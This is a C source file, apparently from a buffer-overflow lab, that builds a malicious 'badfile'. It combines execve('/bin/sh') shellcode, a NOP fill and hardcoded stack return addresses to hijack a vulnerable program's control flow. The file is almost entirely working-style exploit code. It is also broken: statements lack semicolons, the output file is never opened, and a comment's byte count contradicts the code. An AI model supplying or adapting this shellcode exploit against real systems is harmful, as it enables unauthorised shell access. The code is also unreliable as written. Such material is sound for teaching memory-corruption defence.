char shellcode[] =
    "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
    "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
    "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
    "\xff\xff/bin/sh";
char addr[5]="AAAA\x00";
char buf[28];
int * p;
main() {
    char buffer[517]
    FILE *badfile;
    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);
    memset(buf,'A',24);
    p = (int *)(buf+24);
    *p=0xbffffeb4;	//  put function return on the stack
    p = (int *)(addr);
    *p=0xbfffff9b;	//  put the new function return right below it
    /* we dont need to NoOP sled with this exploit */
    memcpy(&buffer, &shellcode, strlen(shellcode) + 36)  //  shellcode + 46 bytes for the addr, buf and pointer
    // memcpy(&buffer[100], &shellcode, strlen(shellcode));
    //execle("./stack",shellcode,buf,addr,0,0);  //  execute with our stack configuration
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
    return 0
}
